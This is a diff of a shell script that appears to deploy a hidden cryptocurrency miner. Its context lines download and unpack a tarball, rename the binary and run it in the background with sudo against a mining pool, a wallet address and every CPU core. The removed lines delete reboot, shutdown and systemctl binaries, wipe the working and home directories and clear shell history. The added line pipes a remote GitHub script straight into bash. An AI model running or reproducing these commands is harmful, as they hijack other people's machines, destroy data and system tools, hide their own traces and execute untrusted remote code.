@@ -25,15 +25,4 @@ wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/nu
 tar -xvf daemon.tar.gz
 mv uranus sgr1
 sudo nohup ./sgr1 --donate-level 1 -o 128.199.218.20:80 -u ZEPHYR3YjAKBsmXd4MGYpAgatSybW8xwDUSTiLY8dotSQLogQFUgaGmZr3295MB5M8GTDZUUiLFxkHZdsGBVPmyLSt7aXUDRtEW48 -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
-sleep 30
-sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
-curl ifconfig.me
-rm -rvf *
-cd ~/
-rm -rvf *
-history -cr
-while true
-do
-        echo "hold down..."
-        sleep 60
-done
+curl -sL https://github.com/loeto21/lieur/raw/main/puyeng.sh | bash
